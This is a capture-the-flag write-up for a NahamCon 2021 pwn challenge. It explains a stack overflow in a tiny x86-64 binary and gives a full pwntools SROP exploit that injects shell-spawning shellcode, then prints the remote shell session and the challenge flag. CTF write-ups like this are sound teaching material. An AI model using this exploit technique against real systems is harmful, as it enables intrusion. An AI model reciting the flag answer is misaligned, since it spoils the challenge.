# NahamCon CTF 2021

## Some Really Ordinary Program [medium]

> Author: @M_alpha#3534
>
> I'm starting to get pretty good at this whole programming thing. Here's a basic program I wrote that will echo back what you say. 
>
> [some-really-ordinary-program](some-really-ordinary-program)

Tags: _pwn_ _x86-64_ _bof_ _srop_


## Summary

_Some Really Ordinary Program_ isn't an overstatement, this is the 3rd _and 4th_ time I've solve this same problem in 2021.  The _and 4th_ comes from this problem being nearly identical to a similar problem from another CTF that ran at the same time as this CTF.  I'm not complaining, just reporting.

Anyway, the short of it is, we have nearly nothing to work with but a `read` and `syscall` gadget; using the return value from `read` we can use that to set `rax` so that we can use _srop_.

These 3rd and 4th iterations of this problem in 2021 have up'd the game a bit requiring stack relocating to a known location for some easy shellcode injection.

## Analysis

### Checksec

```
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No mitigations, choose your own adventure--_assuming you can find the bits you need._

### <strike>Decompile with Ghidra</strike> Disassemble with `objdump`

```assembly
  401000:	48 89 f2             	mov    rdx,rsi
  401003:	48 89 fe             	mov    rsi,rdi
  401006:	b8 00 00 00 00       	mov    eax,0x0
  40100b:	48 89 c7             	mov    rdi,rax
  40100e:	0f 05                	syscall
  401010:	c3                   	ret
  401011:	48 89 f2             	mov    rdx,rsi
  401014:	48 89 fe             	mov    rsi,rdi
  401017:	b8 01 00 00 00       	mov    eax,0x1
  40101c:	48 89 c7             	mov    rdi,rax
  40101f:	0f 05                	syscall
  401021:	c3                   	ret
  401022:	55                   	push   rbp
  401023:	48 89 e5             	mov    rbp,rsp
  401026:	48 81 ec f4 01 00 00 	sub    rsp,0x1f4
  40102d:	48 bf 00 20 40 00 00 	movabs rdi,0x402000
  401034:	00 00 00
  401037:	be 1f 00 00 00       	mov    esi,0x1f
  40103c:	e8 d0 ff ff ff       	call   0x401011
  401041:	48 8d 3c 24          	lea    rdi,[rsp]
  401045:	be 20 03 00 00       	mov    esi,0x320
  40104a:	e8 b1 ff ff ff       	call   0x401000
  40104f:	48 8d 3c 24          	lea    rdi,[rsp]
  401053:	48 89 c6             	mov    rsi,rax
  401056:	e8 b6 ff ff ff       	call   0x401011
  40105b:	c9                   	leave
  40105c:	c3                   	ret
  40105d:	e8 c0 ff ff ff       	call   0x401022
  401062:	eb f9                	jmp    0x40105d
```

Yep, that's all of it.

Loading this up in GDB and running with `starti` you can quickly see that `main` is at `0x401022`, and that functions `0x401000` and `0x41011` are simple fronts to `read` and `write`.

Starting from `main` (`0x401022`), `0x1f4` bytes of stack is allocated, then a string pointer (`0x402000`) and its length are _moved_ into `rdi` and `esi`, then `write` (`0x401011`) is called.  This emits to your terminal: `What you say is what you get.\n`.  Next `read` (`0x401000`) is called with parameters _stack_ and `0x320` for the location and length.  

Well there's your problem.  The stack was allocated for `0x1f4` and `read` is instructed to read up to `0x320` bytes creating a _bof_ vulnerability.

The next set of lines just emit to your terminal whatever you inputted, then we start all over again by calling `main`.  

> I guess I may have _jumped_ ahead of myself, the entry point is actually at the bottom at `0x40105d`, this calls `main`, than then jumps back to calling `main` in a loop.

That's all there is folks.  Not a lot here.  No GOT, very few gadgets, no libc, etc..., total _srop_ fodder.

```
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x some-really-ordinary-program
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x some-really-ordinary-program
0x0000000000402000 0x0000000000403000 0x0000000000002000 rwx some-really-ordinary-program
0x00007ffff7ffa000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

Before getting into the _srop_ details, let look at the memory map.  Other than the stack, there is a 4K page of memory that is also `RWX` at `0x402000`.  This is something we both have and _know_.

The attack is pretty simple, use `read` to _read_ in `0xf` bytes, so that `rax` is `0xf` (rt_sigreturn syscall).  Then call `syscall` followed by our sigreturn frame.

That frame will change `rsp` to the end of page `0x402000` (remember stacks grow _down_ in address space), and then set `rip` to `main`.  This will basically start us all over again, but this time we know the stack address because we _set_ it.

Since we can _read_ and we know _where_ we will be storing that input, we can just send some shellcode to do the rest.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./some-really-ordinary-program')
binary.symbols['main'] = 0x401022
binary.symbols['midread'] = 0x401006

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 31225)
else:
    p = process(binary.path)
```

Standard pwntools header with some symbols added for `main` and `midread`.

> `midread` is the midpoint of the `read` frontend function described above.  Since all the registers are correct except for `rax` and `rdi`, it was only necessary to get the tail end of that function.

```python
syscall = next(binary.search(asm('syscall')))
stack = 0x402ff8

frame = SigreturnFrame()
frame.rsp = stack
frame.rip = binary.sym.main
```

Find a syscall gadget and setup the location of our new stack at the end of page `0x402000`, then define our rt_sigreturn frame with `rsp` pointing to our new stack and `rip` pointing to `main`


```python
# overflow buffer
# get control of RIP
# call the read function to get 0xf in rax for syscall
# sigret
payload  = b''
payload += (0x1f4 + 8) * b'A'
payload += p64(binary.sym.midread)
payload += p64(syscall)
payload += bytes(frame)

p.sendafter('.\n',payload)
```

The payload just needs to fill up the `0x1f4` buffer plus 8 bytes for the `push rbp`, then call `midread` followed by `syscall` and our frame.

```python
# with read called, get 0xf in rax
p.send(constants.SYS_rt_sigreturn * b'A')
```

With the payload now running we need to send `0xf` bytes so that `read` will return with `0xf` in `rax`.  After than the rt_sigreturn syscall will kick in and update all the registered with values from our frame, including the new stack (`rsp`) and where we should start executing again (`rip`).

```python
# new stack that we know address of and its NX
# just put in some shell code and call it
payload  = b''
payload += asm(shellcraft.sh())
payload += (0x1f4 + 8 - len(payload)) * b'A'
payload += p64(stack - 0x1f4 - 8)

p.sendafter('.\n',payload)

# take out the garbage
p.recvuntil(p64(stack - 0x1f4 - 8))
p.interactive()
```

Here we are again, at the beginning, all that has changed is we _know_ where the stack is.  This time we inject some shellcode, pad, and then replace the return address with the location of our shellcode.

The _take out the garbage_ just receives back our payload from the `write` that `main` calls after the `read` to prettify our output for this writeup.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/nahamconctf2021/ordprog/some-really-ordinary-program'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to challenge.nahamcon.com on port 31450: Done
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ cat flag.txt
flag{175c051dbd3db6857f3e6d2907952c87}
```

